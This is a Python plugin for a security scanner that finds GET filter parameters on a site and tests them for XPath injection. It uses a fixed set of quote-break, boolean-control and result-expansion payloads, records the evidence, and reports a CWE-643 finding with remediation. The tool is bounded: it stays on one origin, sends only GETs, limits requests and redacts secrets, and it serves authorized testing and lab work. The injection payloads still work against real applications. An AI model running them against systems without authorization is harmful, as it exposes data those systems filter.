"""Closed root-URL-only XPath filter differential probe (#1295).

The model controls only a credential-free workflow root.  The probe discovers
same-origin GET filter links from that root and owns a fixed XPath-specific
matrix: quote break, syntax repair, false/true ``string-length`` controls,
result-set expansion, stable repeat, and baseline replay.  It never guesses an
endpoint or accepts a model-provided payload.
"""

from __future__ import annotations

import asyncio
import hashlib
import html
import re
import secrets
import socket
import ssl
from html.parser import HTMLParser
from typing import Any, Dict, List, NamedTuple, Optional, Set, Tuple
from urllib.parse import parse_qsl, urlencode, urljoin, urlsplit, urlunsplit

from plugin_interface import ToolPlugin
from tools.web_request_smuggling_probe import read_http_response


MODE = "xpath-filter-differential-v1"
RUNTIME_PROOF = "runtime-read-only"
LAB_PROOF = "lab-state-change"
USER_AGENT = "xASM-XPath-Injection-Probe/1.0"
MAX_TARGET_CHARS = 4_096
MAX_REQUEST_BUDGET = 32
MAX_RESPONSE_BYTES = 250_000
MAX_EVIDENCE_CHARS = 96_000
MAX_CANDIDATES = 5
FILTER_PARAMETER_NAMES = {
    "category",
    "filter",
    "q",
    "query",
    "search",
    "tag",
    "term",
}
UNSAFE_PATH_RE = re.compile(
    r"(?:^|/)(?:login|logout|signout|checkout|purchase|cart|delete|destroy|remove|"
    r"update|edit|reset|forgot-password)(?:/|$)",
    re.I,
)
XPATH_ERROR_MARKERS = (
    "xpath",
    "invalid predicate",
    "invalid expression",
    "unterminated literal",
    "unclosed literal",
    "unmatched quote",
    "expected token",
    "xml query syntax",
)
ENTITY_ID_RE = re.compile(
    r"(?i)(?:^|[_-])(?:id|identifier)$|^(?:product|item|post|record|user)id$"
)
SENSITIVE_HEADER_RE = re.compile(
    r"(?im)^(authorization|cookie|set-cookie|proxy-authorization|x-api-key|"
    r"x-csrf-token|x-xsrf-token)\s*:\s*([^\r\n]*)(?=\r?$)"
)
EMAIL_RE = re.compile(r"(?i)\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}\b")
TOKEN_RE = re.compile(
    r"\b(?:eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}|"
    r"[A-Za-z0-9_+/.=-]{48,})\b"
)

EVIDENCE_LABELS = (
    "xpath-root-baseline",
    "xpath-route-negative-control",
    "xpath-parameter-baseline",
    "xpath-syntax-break-control",
    "xpath-syntax-repair-control",
    "xpath-function-false-control",
    "xpath-function-true-control",
    "xpath-result-expansion-proof",
    "xpath-result-expansion-repeat",
    "xpath-baseline-replay",
)


class _PinnedOrigin(NamedTuple):
    scheme: str
    hostname: str
    port: int
    family: int
    ip: str


class _LinkParser(HTMLParser):
    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self.hrefs: List[str] = []

    def handle_starttag(
        self, tag: str, attrs: List[Tuple[str, Optional[str]]]
    ) -> None:
        if tag.lower() != "a":
            return
        for name, value in attrs:
            if str(name).lower() == "href" and value:
                self.hrefs.append(str(value).strip())


def _sha(value: str) -> str:
    return hashlib.sha256(value.encode("utf-8", "replace")).hexdigest()


def _bounded_int(value: Any, default: int, low: int, high: int) -> int:
    try:
        return max(low, min(int(value), high))
    except (TypeError, ValueError):
        return default


def _origin_tuple(value: str) -> Tuple[str, str, int]:
    parsed = urlsplit(value)
    scheme = parsed.scheme.lower()
    return (
        scheme,
        (parsed.hostname or "").lower(),
        parsed.port or (443 if scheme == "https" else 80),
    )


def _origin_value(value: str) -> str:
    parsed = urlsplit(value)
    scheme = parsed.scheme.lower()
    host = (parsed.hostname or "").lower()
    port = parsed.port or (443 if scheme == "https" else 80)
    default = 443 if scheme == "https" else 80
    formatted = f"[{host}]" if ":" in host else host
    return f"{scheme}://{formatted}{'' if port == default else f':{port}'}"


def _same_origin(left: str, right: str) -> bool:
    return _origin_tuple(left) == _origin_tuple(right)


def _validate_target(value: Any) -> Optional[str]:
    raw = str(value or "").strip()
    if not raw or len(raw) > MAX_TARGET_CHARS or any(ch in raw for ch in "\r\n\0"):
        return None
    try:
        parsed = urlsplit(raw)
        _ = parsed.port
    except ValueError:
        return None
    if (
        parsed.scheme.lower() not in {"http", "https"}
        or not parsed.hostname
        or parsed.username
        or parsed.password
        or parsed.query
        or parsed.fragment
        or parsed.path not in {"", "/"}
    ):
        return None
    return f"{_origin_value(raw)}/"


def _marker(value: str) -> str:
    return f"[REDACTED sha256={_sha(value)} len={len(value)}]"


def _response_has_xpath_error(status: int, body: str) -> bool:
    lower = str(body or "").lower()
    return status >= 500 or any(marker in lower for marker in XPATH_ERROR_MARKERS)


def _entity_keys(body: str, base_url: str) -> Set[str]:
    parser = _LinkParser()
    try:
        parser.feed(str(body or "")[:MAX_EVIDENCE_CHARS])
    except Exception:
        return set()
    found: Set[str] = set()
    for raw in parser.hrefs[:500]:
        absolute = urljoin(base_url, html.unescape(raw))
        if not _same_origin(base_url, absolute):
            continue
        parsed = urlsplit(absolute)
        for name, value in parse_qsl(parsed.query, keep_blank_values=True)[:20]:
            if (
                value
                and len(value) <= 80
                and re.fullmatch(r"[A-Za-z0-9_-]+", value)
                and ENTITY_ID_RE.search(name)
            ):
                found.add(f"{parsed.path}?{name.lower()}={value}")
        segments = [segment for segment in parsed.path.split("/") if segment]
        if (
            len(segments) >= 2
            and re.fullmatch(r"[A-Za-z0-9_-]{1,80}", segments[-1])
            and re.search(r"(?i)(?:product|item|post|record|user)s?", segments[-2])
        ):
            found.add(f"/{segments[-2].lower()}/{segments[-1]}")
    return found


def _entity_fingerprint(keys: Set[str]) -> str:
    return _sha("\n".join(sorted(keys)))


class WebXPathInjectionProbeTool(ToolPlugin):
    @property
    def name(self) -> str:
        return "web:xpath_injection_probe"

    @property
    def description(self) -> str:
        return (
            "Discovers a same-origin GET filter from a root URL and proves XPath "
            "injection through a fixed quote, repair, string-length false/true, "
            "stable expansion, repeat, and replay matrix."
        )

    @property
    def schema(self) -> Dict[str, Any]:
        owned = {"x-workflow-owned": True}
        hidden = {"x-hidden": True, "x-workflow-owned": True}
        return {
            "type": "object",
            "additionalProperties": False,
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "format": "uri"},
                "mode": {
                    "type": "string", "enum": [MODE], "default": MODE, **owned
                },
                "proofLevel": {
                    "type": "string",
                    "enum": [RUNTIME_PROOF, LAB_PROOF],
                    "default": RUNTIME_PROOF,
                    **owned,
                },
                "engagement": {
                    "type": "string",
                    "enum": ["standard", "aggressive", "lab", "ctf"],
                    "default": "standard",
                    **owned,
                },
                "discoverFromTarget": {
                    "type": "boolean", "default": True, **owned
                },
                "candidateBudget": {
                    "type": "integer",
                    "minimum": 1,
                    "maximum": MAX_CANDIDATES,
                    "default": 5,
                    **owned,
                },
                "requestBudget": {
                    "type": "integer",
                    "minimum": 10,
                    "maximum": MAX_REQUEST_BUDGET,
                    "default": 32,
                    **owned,
                },
                "maxResponseBytes": {
                    "type": "integer",
                    "minimum": 4_096,
                    "maximum": MAX_RESPONSE_BYTES,
                    "default": 96_000,
                    **owned,
                },
                "stopAfterFirstFinding": {
                    "type": "boolean", "default": True, **owned
                },
                "authCookies": {"type": "string", **hidden},
                "authHeaders": {
                    "type": "object",
                    "additionalProperties": {"type": "string"},
                    **hidden,
                },
            },
        }

    @property
    def metadata(self) -> Dict[str, Any]:
        return {
            "category": "exploit-test",
            "phase": 3,
            "domain": ["web", "api"],
            "input_type": ["url", "authenticated-session"],
            "output_type": ["findings"],
            "chainable_after": ["browser:map_app", "param:discover", "katana:"],
            "chainable_before": ["decision:"],
            "taxonomy_domain": ["web", "api"],
            "lifecycle_phase": "exploit-test",
            "purpose_count": "single",
            "primary_purpose": "Prove bounded XPath filter result-set expansion",
        }

    async def execute(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        target = _validate_target(parameters.get("target"))
        if not target:
            return self._error("target must be a credential-free HTTP(S) root URL")
        if str(parameters.get("mode") or MODE) != MODE:
            return self._error(f"mode must be {MODE}", target)
        proof_level = str(parameters.get("proofLevel") or RUNTIME_PROOF)
        engagement = str(parameters.get("engagement") or "standard").lower()
        if proof_level not in {RUNTIME_PROOF, LAB_PROOF}:
            return self._error("unsupported proofLevel", target)
        if engagement not in {"standard", "aggressive", "lab", "ctf"}:
            return self._error("unsupported engagement", target)
        if proof_level == LAB_PROOF and engagement not in {"lab", "ctf"}:
            return self._error(
                "lab-state-change proof requires lab or ctf engagement", target
            )
        if parameters.get("discoverFromTarget", True) is not True:
            return self._error("discoverFromTarget must remain enabled", target)
        if parameters.get("stopAfterFirstFinding", True) is not True:
            return self._error("stopAfterFirstFinding must remain enabled", target)

        auth_headers, workflow_cookie, auth_error = self._auth_context(parameters)
        if auth_error:
            return self._error(auth_error, target)
        self._target = target
        self._auth_headers = auth_headers
        self._workflow_cookie = workflow_cookie
        self._cookies = self._parse_cookie_header(workflow_cookie or "")
        self._bootstrap_cookie_header: Optional[str] = None
        self._secrets: Set[str] = set(auth_headers.values())
        if workflow_cookie:
            self._secrets.add(workflow_cookie)
            self._secrets.update(self._cookies.values())
        auth_material: List[str] = []
        if workflow_cookie:
            auth_material.append(f"cookie:{workflow_cookie}")
        auth_material.extend(
            f"{name.lower()}:{value}" for name, value in sorted(auth_headers.items())
        )
        self._workflow_auth_context_sha = _sha(
            "\n".join(auth_material) or f"anonymous:{_origin_value(target)}/"
        )
        self._auth_context_sha = self._workflow_auth_context_sha
        self._session_source = (
            "workflow-auth-context" if auth_material else "anonymous"
        )
        self._requests = 0
        self._budget = _bounded_int(
            parameters.get("requestBudget"), 32, 10, MAX_REQUEST_BUDGET
        )
        self._candidate_budget = _bounded_int(
            parameters.get("candidateBudget"), 5, 1, MAX_CANDIDATES
        )
        self._max_body = _bounded_int(
            parameters.get("maxResponseBytes"), 96_000, 4_096, MAX_RESPONSE_BYTES
        )
        self._timeout = 20

        try:
            self._pin = await self._resolve_once(target)
            root = await self._request(target)
            self._refresh_session_context()
            root_step = self._evidence(EVIDENCE_LABELS[0], root)
            if root["status"] != 200:
                return self._result(
                    target, proof_level, "root did not return HTTP 200", [root_step]
                )
            negative_path = f"/.xasm-xpath-negative-{secrets.token_hex(12)}"
            negative = await self._request(
                f"{_origin_value(target)}{negative_path}"
            )
            negative_step = self._evidence(EVIDENCE_LABELS[1], negative)
            if negative["status"] not in {404, 410}:
                return self._result(
                    target,
                    proof_level,
                    "random same-origin route did not reject cleanly",
                    [root_step, negative_step],
                )

            candidates = self._discover_candidates(root["body"], target)
            for endpoint, parameter, baseline_value in candidates[: self._candidate_budget]:
                proof = await self._probe_candidate(endpoint, parameter, baseline_value)
                if not proof:
                    continue
                steps = [root_step, negative_step, *proof["steps"]]
                solved_transition = False
                if proof_level == LAB_PROOF:
                    final_root = await self._request(target)
                    steps.append(self._evidence("lab-solved-confirmation", final_root))
                    solved_transition = self._is_unsolved(root["body"]) and self._is_solved(
                        final_root["body"]
                    )
                    if not solved_transition:
                        continue

                verification = self._verification(
                    proof_level,
                    steps,
                    verified=True,
                    endpoint=endpoint,
                    parameter=parameter,
                    baseline_value=baseline_value,
                    proof=proof,
                    solved_transition=solved_transition,
                )
                decisive = next(
                    step
                    for step in proof["steps"]
                    if step["label"] == "xpath-result-expansion-proof"
                )
                finding = self._finding(
                    endpoint, parameter, proof, verification, decisive
                )
                return {
                    "success": True,
                    "tool": self.name,
                    "target": target,
                    "mode": MODE,
                    "proofLevel": proof_level,
                    "sessionSource": self._session_source,
                    "verified": True,
                    "fallback": False,
                    "requestCount": self._requests,
                    "findings": [finding],
                    "total_findings": 1,
                    "verification": verification,
                    "summary": {
                        "verified": True,
                        "parameter": parameter,
                        "baselineEntities": len(proof["baseline_keys"]),
                        "expandedEntities": len(
                            proof["expansion_keys"] - proof["baseline_keys"]
                        ),
                        "requests": self._requests,
                        "fallback": False,
                    },
                }
            return self._result(
                target,
                proof_level,
                "no stable XPath filter differential was proven",
                [root_step, negative_step],
            )
        except Exception as exc:
            return self._error(str(exc)[:300], target)

    def _auth_context(
        self, parameters: Dict[str, Any]
    ) -> Tuple[Dict[str, str], Optional[str], Optional[str]]:
        cookie: Optional[str] = None
        raw_cookie = parameters.get("authCookies")
        if raw_cookie is not None:
            if (
                not isinstance(raw_cookie, str)
                or not raw_cookie.strip()
                or len(raw_cookie) > 8_192
                or any(ch in raw_cookie for ch in "\r\n\0")
                or "=" not in raw_cookie
            ):
                return {}, None, "invalid server-owned cookie context"
            cookie = raw_cookie.strip()
        headers: Dict[str, str] = {}
        raw_headers = parameters.get("authHeaders") or {}
        if not isinstance(raw_headers, dict):
            return {}, None, "invalid server-owned auth header context"
        for name, value in raw_headers.items():
            lower = str(name or "").strip().lower()
            if lower not in {"authorization", "x-api-key"}:
                return {}, None, "only Authorization and X-Api-Key auth headers are supported"
            if (
                not isinstance(value, str)
                or not value
                or len(value) > 8_192
                or any(ch in value for ch in "\r\n\0")
            ):
                return {}, None, "invalid server-owned auth header value"
            canonical = "Authorization" if lower == "authorization" else "X-Api-Key"
            headers[canonical] = value
        return headers, cookie, None

    def _parse_cookie_header(self, value: str) -> Dict[str, str]:
        cookies: Dict[str, str] = {}
        for part in str(value or "").split(";"):
            if "=" not in part:
                continue
            name, cookie_value = part.split("=", 1)
            name = name.strip()
            cookie_value = cookie_value.strip()
            if (
                name
                and cookie_value
                and re.fullmatch(r"[!#$%&'*+.^_`|~0-9A-Za-z-]+", name)
            ):
                cookies[name] = cookie_value
        return cookies

    def _capture_bootstrap_cookie(self, response: Dict[str, Any]) -> None:
        if self._workflow_cookie is not None or self._auth_headers:
            return
        captured: Dict[str, str] = {}
        for name, value in response.get("headers", []):
            if str(name).lower() != "set-cookie":
                continue
            first = str(value).split(";", 1)[0]
            captured.update(self._parse_cookie_header(first))
            self._secrets.add(str(value))
        if not captured:
            return
        self._cookies.update(captured)
        self._secrets.update(captured.values())
        self._bootstrap_cookie_header = "; ".join(
            f"{name}={value}" for name, value in sorted(captured.items())
        )

    def _refresh_session_context(self) -> None:
        if self._workflow_cookie is not None or self._auth_headers:
            self._session_source = "workflow-auth-context"
            self._auth_context_sha = self._workflow_auth_context_sha
        elif self._bootstrap_cookie_header:
            self._session_source = "target-bootstrap-cookie"
            self._auth_context_sha = _sha(self._bootstrap_cookie_header)
        else:
            self._session_source = "anonymous"
            self._auth_context_sha = _sha(
                f"anonymous:{_origin_value(self._target)}/"
            )

    def _cookie_header(self) -> str:
        return "; ".join(
            f"{name}={value}" for name, value in sorted(self._cookies.items())
        )

    async def _resolve_once(self, target: str) -> _PinnedOrigin:
        parsed = urlsplit(target)
        host = str(parsed.hostname or "")
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        addresses = await asyncio.wait_for(
            asyncio.get_running_loop().getaddrinfo(
                host, port, type=socket.SOCK_STREAM
            ),
            timeout=20,
        )
        if not addresses:
            raise OSError("target DNS resolution returned no addresses")
        family, _type, _proto, _canon, sockaddr = addresses[0]
        return _PinnedOrigin(parsed.scheme, host, port, family, str(sockaddr[0]))

    def _host_header(self) -> str:
        default = 443 if self._pin.scheme == "https" else 80
        return (
            self._pin.hostname
            if self._pin.port == default
            else f"{self._pin.hostname}:{self._pin.port}"
        )

    async def _request(self, url: str) -> Dict[str, Any]:
        if self._requests >= self._budget:
            raise ValueError("request budget exhausted")
        if not _same_origin(url, self._target):
            raise ValueError("request left the authorized origin")
        parsed = urlsplit(url)
        path = parsed.path or "/"
        if parsed.query:
            path += "?" + parsed.query
        lines = [
            f"GET {path} HTTP/1.1",
            f"Host: {self._host_header()}",
            f"User-Agent: {USER_AGENT}",
            "Accept: text/html, application/json;q=0.8",
            "Accept-Encoding: identity",
            "Cache-Control: no-store",
            "Connection: close",
        ]
        lines.extend(f"{name}: {value}" for name, value in self._auth_headers.items())
        cookie = self._cookie_header()
        if cookie:
            lines.append(f"Cookie: {cookie}")
        raw = ("\r\n".join(lines) + "\r\n\r\n").encode("utf-8")
        ssl_context = ssl.create_default_context() if parsed.scheme == "https" else None
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(
                host=self._pin.ip,
                port=self._pin.port,
                family=self._pin.family,
                ssl=ssl_context,
                server_hostname=self._pin.hostname if ssl_context else None,
            ),
            timeout=self._timeout,
        )
        self._requests += 1
        try:
            writer.write(raw)
            await writer.drain()
            response = await read_http_response(reader, self._timeout)
        finally:
            writer.close()
            try:
                await writer.wait_closed()
            except (ConnectionError, ssl.SSLError):
                pass
        body_bytes = bytes(response.get("bodyBytes") or b"")
        if len(body_bytes) > self._max_body:
            raise ValueError("response exceeded bounded body limit")
        response.update(
            {"url": url, "rawRequest": raw.decode("utf-8", "replace")}
        )
        if self._requests == 1:
            self._capture_bootstrap_cookie(response)
        return response

    def _discover_candidates(
        self, body: str, base_url: str
    ) -> List[Tuple[str, str, str]]:
        parser = _LinkParser()
        try:
            parser.feed(str(body or "")[: self._max_body])
        except Exception:
            return []
        ranked: List[Tuple[int, str, str, str]] = []
        seen: Set[Tuple[str, str]] = set()
        for raw in [base_url, *parser.hrefs[:300]]:
            candidate = html.unescape(str(raw or "")).strip()
            if (
                not candidate
                or len(candidate) > 2_048
                or any(ch in candidate for ch in "\r\n\0\\")
                or candidate.startswith(("javascript:", "data:", "mailto:", "tel:", "//"))
            ):
                continue
            endpoint = urljoin(base_url, candidate)
            try:
                parsed = urlsplit(endpoint)
            except ValueError:
                continue
            if (
                parsed.scheme not in {"http", "https"}
                or not _same_origin(base_url, endpoint)
                or parsed.username
                or parsed.password
                or parsed.fragment
                or UNSAFE_PATH_RE.search(parsed.path)
                or not parsed.query
            ):
                continue
            pairs = parse_qsl(parsed.query, keep_blank_values=True)
            for name, value in pairs[:20]:
                lower = name.lower()
                if (
                    lower not in FILTER_PARAMETER_NAMES
                    or not value
                    or len(value) > 80
                    or any(ch in value for ch in "\r\n\0'\"\\")
                    or not re.fullmatch(r"[A-Za-z0-9 _.-]+", value)
                ):
                    continue
                key = (endpoint, name)
                if key in seen:
                    continue
                seen.add(key)
                rank = 0 if lower == "category" else 1 if lower in {"filter", "search"} else 2
                ranked.append((rank, endpoint, name, value))
        ranked.sort(key=lambda row: (row[0], len(urlsplit(row[1]).path), row[1], row[2]))
        return [
            (endpoint, name, value)
            for _rank, endpoint, name, value in ranked
        ]

    async def _probe_candidate(
        self, endpoint: str, parameter: str, baseline_value: str
    ) -> Optional[Dict[str, Any]]:
        payloads = {
            "break": baseline_value + "'",
            "repair": baseline_value + "' and '1'='1",
            "false": baseline_value + "' and string-length('x')=2 and '1'='1",
            "true_control": baseline_value + "' and string-length('x')=1 and '1'='1",
            "expansion": baseline_value + "' or string-length('x')=1 or '1'='2",
        }
        baseline = await self._request(endpoint)
        syntax_break = await self._request(
            self._mutate(endpoint, parameter, payloads["break"])
        )
        syntax_repair = await self._request(
            self._mutate(endpoint, parameter, payloads["repair"])
        )
        false_control = await self._request(
            self._mutate(endpoint, parameter, payloads["false"])
        )
        true_control = await self._request(
            self._mutate(endpoint, parameter, payloads["true_control"])
        )
        expansion = await self._request(
            self._mutate(endpoint, parameter, payloads["expansion"])
        )
        baseline_keys = _entity_keys(baseline["body"], endpoint)
        repair_keys = _entity_keys(syntax_repair["body"], endpoint)
        false_keys = _entity_keys(false_control["body"], endpoint)
        true_control_keys = _entity_keys(true_control["body"], endpoint)
        expansion_keys = _entity_keys(expansion["body"], endpoint)
        if (
            any(
                observation["status"] != 200
                for observation in (
                    baseline,
                    syntax_repair,
                    false_control,
                    true_control,
                    expansion,
                )
            )
            or not _response_has_xpath_error(
                syntax_break["status"], syntax_break["body"]
            )
            or _response_has_xpath_error(
                syntax_repair["status"], syntax_repair["body"]
            )
            or len(baseline_keys) < 1
            or repair_keys != baseline_keys
            or true_control_keys != baseline_keys
            or false_keys
            or len(expansion_keys) < len(baseline_keys) + 2
            or len(expansion_keys - baseline_keys) < 2
        ):
            return None
        expansion_repeat = await self._request(expansion["url"])
        baseline_replay = await self._request(endpoint)
        repeat_keys = _entity_keys(expansion_repeat["body"], endpoint)
        replay_keys = _entity_keys(baseline_replay["body"], endpoint)
        if (
            expansion_repeat["status"] != 200
            or baseline_replay["status"] != 200
            or repeat_keys != expansion_keys
            or replay_keys != baseline_keys
        ):
            return None
        observations = (
            (EVIDENCE_LABELS[2], baseline, baseline_keys),
            (EVIDENCE_LABELS[3], syntax_break, set()),
            (EVIDENCE_LABELS[4], syntax_repair, repair_keys),
            (EVIDENCE_LABELS[5], false_control, false_keys),
            (EVIDENCE_LABELS[6], true_control, true_control_keys),
            (EVIDENCE_LABELS[7], expansion, expansion_keys),
            (EVIDENCE_LABELS[8], expansion_repeat, repeat_keys),
            (EVIDENCE_LABELS[9], baseline_replay, replay_keys),
        )
        return {
            "baseline_keys": baseline_keys,
            "false_keys": false_keys,
            "true_control_keys": true_control_keys,
            "expansion_keys": expansion_keys,
            "steps": [
                self._evidence(label, observation, entity_keys=keys)
                for label, observation, keys in observations
            ],
        }

    def _mutate(self, endpoint: str, parameter: str, value: str) -> str:
        parsed = urlsplit(endpoint)
        pairs = parse_qsl(parsed.query, keep_blank_values=True)
        mutated: List[Tuple[str, str]] = []
        replaced = False
        for name, current in pairs:
            if name == parameter and not replaced:
                mutated.append((name, value))
                replaced = True
            else:
                mutated.append((name, current))
        if not replaced:
            raise ValueError("observed parameter disappeared from candidate URL")
        return urlunsplit(
            (parsed.scheme, parsed.netloc, parsed.path, urlencode(mutated), "")
        )

    def _sanitize(self, value: str) -> str:
        safe = str(value or "").replace("\0", "")

        def redact_header(match: re.Match[str]) -> str:
            name = match.group(1)
            raw_value = match.group(2).strip()
            marker_value = (
                raw_value.split(";", 1)[0]
                if name.lower() == "set-cookie"
                else raw_value
            )
            return f"{name}: {_marker(marker_value)}"

        safe = SENSITIVE_HEADER_RE.sub(redact_header, safe)
        protected: List[Tuple[str, str]] = []
        for index, match in enumerate(
            re.finditer(
                r"\[REDACTED sha256=[0-9a-f]{64} len=[1-9]\d{0,5}\]", safe
            )
        ):
            sentinel = f"<xasm-xpath-marker-{index}>"
            protected.append((sentinel, match.group(0)))
            safe = safe.replace(match.group(0), sentinel, 1)
        for index, match in enumerate(
            list(re.finditer(r"/\.xasm-xpath-negative-[0-9a-f]{24}", safe))
        ):
            sentinel = f"<xasm-xpath-control-{index}>"
            protected.append((sentinel, match.group(0)))
            safe = safe.replace(match.group(0), sentinel, 1)
        for secret in sorted(
            (secret for secret in self._secrets if len(secret) >= 3),
            key=len,
            reverse=True,
        ):
            safe = safe.replace(secret, "<redacted-runtime-secret>")
        safe = EMAIL_RE.sub(lambda match: _marker(match.group(0)), safe)
        safe = TOKEN_RE.sub(lambda match: _marker(match.group(0)), safe)
        for sentinel, original in protected:
            safe = safe.replace(sentinel, original)
        safe = re.sub(r"\r?\n{3,}", "\r\n\r\n", safe)
        if len(safe) > MAX_EVIDENCE_CHARS:
            raise ValueError("evidence exceeded bounded non-truncating limit")
        return safe

    def _evidence(
        self,
        label: str,
        observation: Dict[str, Any],
        *,
        entity_keys: Optional[Set[str]] = None,
    ) -> Dict[str, Any]:
        request = self._sanitize(observation["rawRequest"])
        body = self._sanitize(str(observation.get("body") or ""))
        content_type = "text/html; charset=utf-8"
        for name, value in observation.get("headers", []):
            if str(name).lower() == "content-type":
                content_type = str(value)
                break
        response_headers = [
            f"HTTP/1.1 {int(observation['status'])} Xasm",
            f"Content-Type: {content_type}",
            f"Content-Length: {len(body.encode('utf-8'))}",
            "Cache-Control: no-store",
        ]
        response_headers.extend(
            f"Set-Cookie: {value}"
            for name, value in observation.get("headers", [])
            if str(name).lower() == "set-cookie"
        )
        response = self._sanitize("\r\n".join(response_headers)) + "\r\n\r\n" + body
        step: Dict[str, Any] = {
            "label": label,
            "url": observation["url"],
            "request": request,
            "requestSha256": _sha(request),
            "response": response,
            "responseSha256": _sha(response),
            "responseBodySha256": _sha(body),
            "responseBodyLength": len(body.encode("utf-8")),
            "responseStatus": int(observation["status"]),
            "responseExcerptTruncated": False,
            "authContextSha256": self._auth_context_sha,
        }
        if entity_keys is not None:
            step.update(
                {
                    "entityKeys": sorted(entity_keys),
                    "entityCount": len(entity_keys),
                    "entityFingerprintSha256": _entity_fingerprint(entity_keys),
                }
            )
        return step

    def _verification(
        self,
        proof_level: str,
        steps: List[Dict[str, Any]],
        *,
        verified: bool,
        endpoint: Optional[str] = None,
        parameter: Optional[str] = None,
        baseline_value: Optional[str] = None,
        proof: Optional[Dict[str, Any]] = None,
        solved_transition: bool = False,
        reason: Optional[str] = None,
    ) -> Dict[str, Any]:
        baseline_keys = set((proof or {}).get("baseline_keys") or set())
        false_keys = set((proof or {}).get("false_keys") or set())
        true_control_keys = set((proof or {}).get("true_control_keys") or set())
        expansion_keys = set((proof or {}).get("expansion_keys") or set())
        return {
            "verified": verified,
            "fallback": False,
            "mode": MODE,
            "proofLevel": proof_level,
            "targetOrigin": _origin_value(self._target),
            "endpointUrl": endpoint,
            "parameterName": parameter,
            "baselineValueSha256": _sha(baseline_value) if baseline_value else None,
            "baselineValueLength": len(baseline_value) if baseline_value else None,
            "baselineEntityFingerprintSha256": (
                _entity_fingerprint(baseline_keys) if baseline_keys else None
            ),
            "baselineEntityCount": len(baseline_keys),
            "breakErrorObserved": verified,
            "syntaxBreakObserved": verified,
            "syntaxRepairMatched": verified,
            "xpathStringLengthFunctionProven": verified,
            "trueControlMatched": verified,
            "falseControlRejected": verified,
            "resultSetExpanded": verified,
            "repeatStable": verified,
            "baselineReplayStable": verified,
            "falseEntityCount": len(false_keys),
            "trueControlEntityCount": len(true_control_keys),
            "resultEntityCount": len(expansion_keys),
            "expandedEntityCount": len(expansion_keys - baseline_keys),
            "requestCount": self._requests,
            "authContextSha256": self._auth_context_sha,
            "sessionSource": self._session_source,
            "cookieJarUsed": bool(self._cookies),
            "networkDestinationPreserved": True,
            "destinationIpPinned": True,
            "dnsResolvedOnce": True,
            "freshConnectionPerRequest": True,
            "redirectsFollowed": False,
            "tlsSniPreserved": urlsplit(self._target).scheme == "https",
            "stateChangingMethods": [],
            "labSolvedTransition": solved_transition,
            "xpathEvidence": {"version": 1, "steps": steps},
            **({"reason": reason} if reason else {}),
        }

    def _result(
        self,
        target: str,
        proof_level: str,
        reason: str,
        steps: List[Dict[str, Any]],
    ) -> Dict[str, Any]:
        verification = self._verification(
            proof_level, steps, verified=False, reason=reason
        )
        return {
            "success": True,
            "tool": self.name,
            "target": target,
            "mode": MODE,
            "proofLevel": proof_level,
            "sessionSource": self._session_source,
            "verified": False,
            "fallback": False,
            "requestCount": self._requests,
            "findings": [],
            "total_findings": 0,
            "verification": verification,
            "summary": {
                "requests": self._requests,
                "findings": 0,
                "fallback": False,
            },
        }

    def _finding(
        self,
        endpoint: str,
        parameter: str,
        proof: Dict[str, Any],
        verification: Dict[str, Any],
        decisive: Dict[str, Any],
    ) -> Dict[str, Any]:
        return {
            "template-id": "xasm-xpath-filter-differential-verified",
            "matcher-name": "stable-xpath-result-set-expansion",
            "matched-at": endpoint,
            "host": _origin_value(endpoint),
            "type": "http",
            "request": decisive["request"],
            "response": decisive["response"],
            "evidence": verification,
            "extracted-results": [
                f"parameter:{parameter}",
                f"baseline-entities:{len(proof['baseline_keys'])}",
                f"expanded-entities:{len(proof['expansion_keys'] - proof['baseline_keys'])}",
            ],
            "info": {
                "name": "XPath Predicate Injection Expands XML-backed Query Results",
                "severity": "medium",
                "description": (
                    "A root-observed GET filter accepted XPath predicates. A repaired quote "
                    "and true string-length control matched the baseline, the false control "
                    "returned no records, and the expansion predicate repeatedly exposed "
                    "additional stable records."
                ),
                "remediation": (
                    "Do not concatenate request values into XPath expressions. Use variable "
                    "binding or a strict allowlist and compare typed values outside XPath."
                ),
                "classification": {"cwe-id": ["CWE-643"]},
            },
        }

    def _is_unsolved(self, body: str) -> bool:
        lower = str(body or "").lower()
        return "is-notsolved" in lower and "is-solved" not in lower

    def _is_solved(self, body: str) -> bool:
        lower = str(body or "").lower()
        return "is-solved" in lower and "is-notsolved" not in lower

    def _error(self, message: str, target: Optional[str] = None) -> Dict[str, Any]:
        return {
            "success": False,
            "tool": self.name,
            "target": target,
            "mode": MODE,
            "verified": False,
            "fallback": False,
            "error": message,
            "findings": [],
        }


def get_tool() -> WebXPathInjectionProbeTool:
    return WebXPathInjectionProbeTool()
